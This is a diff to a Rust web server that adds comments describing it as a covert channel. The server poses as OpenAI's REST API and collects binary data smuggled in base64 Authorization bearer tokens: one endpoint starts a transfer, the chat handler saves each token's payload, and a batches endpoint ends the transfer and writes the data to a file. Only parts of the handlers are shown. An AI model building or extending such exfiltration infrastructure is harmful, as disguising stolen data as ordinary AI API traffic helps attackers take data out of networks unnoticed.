@@ -16,11 +16,13 @@ impl AppState {
     }
 }
 
+// Covert channel receiving binary data encoded as b64 Auth tokens
 #[tokio::main]
 async fn main() {
     tracing_subscriber::fmt::init();
 
     let shared_state = Arc::new(Mutex::new(AppState::new()));
+    // Mimicking OpenAi's REST API
     let app = Router::new()
         .route("/embeddings", post(create_embeddings))
         .route("/chat/completions", post(chat))
@@ -36,6 +38,7 @@ async fn main() {
     axum::serve(listener, app).await.unwrap();
 }
 
+// Indicate to start receiving data
 async fn create_embeddings(State(state): State<Arc<Mutex<AppState>>>) -> StatusCode {
     let state = state.lock();
     let mut state = state.unwrap();
@@ -43,6 +46,7 @@ async fn create_embeddings(State(state): State<Arc<Mutex<AppState>>>) -> StatusC
     StatusCode::CREATED
 }
 
+// Read and save the send data
 async fn chat(headers: HeaderMap, State(state): State<Arc<Mutex<AppState>>>) -> StatusCode {
     let state = state.lock();
     let mut state = state.unwrap();
@@ -50,6 +54,7 @@ async fn chat(headers: HeaderMap, State(state): State<Arc<Mutex<AppState>>>) -> 
         return StatusCode::UNAUTHORIZED;
     }
 
+    // Token header should be { "Authorization": "Bearer <value>" }
     let bearer = headers.get("Authorization");
     if bearer.is_none() {
         return StatusCode::UNAUTHORIZED;
@@ -76,6 +81,7 @@ async fn chat(headers: HeaderMap, State(state): State<Arc<Mutex<AppState>>>) -> 
     StatusCode::OK
 }
 
+// Indicate data has been sent and to write data to file
 async fn batches(State(state): State<Arc<Mutex<AppState>>>) -> StatusCode {
     let state = state.lock();
     let state = state.unwrap();
